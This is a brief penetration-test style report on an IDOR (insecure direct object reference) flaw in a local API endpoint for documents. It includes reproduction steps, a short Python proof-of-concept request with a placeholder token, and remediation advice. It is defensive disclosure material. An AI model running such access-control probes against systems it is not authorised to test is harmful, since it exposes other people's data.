# IDOR Vulnerability Report

## Executive Summary

| **Vulnerability**      | **IDOR (Insecure Direct Object Reference)** |
|-------------------------|--------------------------------------------|
| **Affected Endpoint**  | `/api/documents/102`                       |
| **Severity**           | High                                      |
| **Impact**             | Unauthorized access to sensitive data     |

## Description

The `/api/documents/102` endpoint was identified as vulnerable to IDOR attacks. An unauthenticated or unauthorized user can directly access sensitive data by manipulating the `id` parameter in the API URL. This was validated using a proof-of-concept (PoC) Python script.

## Steps to Reproduce

1. Send a GET request to `http://127.0.0.1:8888/api/documents/102`
   - Include Authorization headers if the application requires it.
   - Observe the response body and status code.
2. If the response contains sensitive or restricted data, the endpoint is vulnerable to IDOR.

PoC script:
```python
import requests

url = "http://127.0.0.1:8888/api/documents/102"
headers = {
    'Authorization': 'Bearer <replace_with_valid_token_if_required>'
}
response = requests.get(url, headers=headers)

if response.status_code == 200:
    print("Potential IDOR found! Response:", response.text)
else:
    print("Access denied.", response.status_code)
```

## Impact

Sensitive user or system data may be exposed to unauthorized users, leading to a compromise of confidentiality.

## Remediation

1. Implement access control checks for user authorization and ownership verification at the backend.
2. Use session tokens or contextual metadata to ensure valid access permissions.
3. Regularly audit endpoints for direct object references.

## Evidence

Detailed PoC and endpoint response are available in the Python script located at:
`/home/ikhsan/Documents/Cybermes/reports/poc_idor.py`.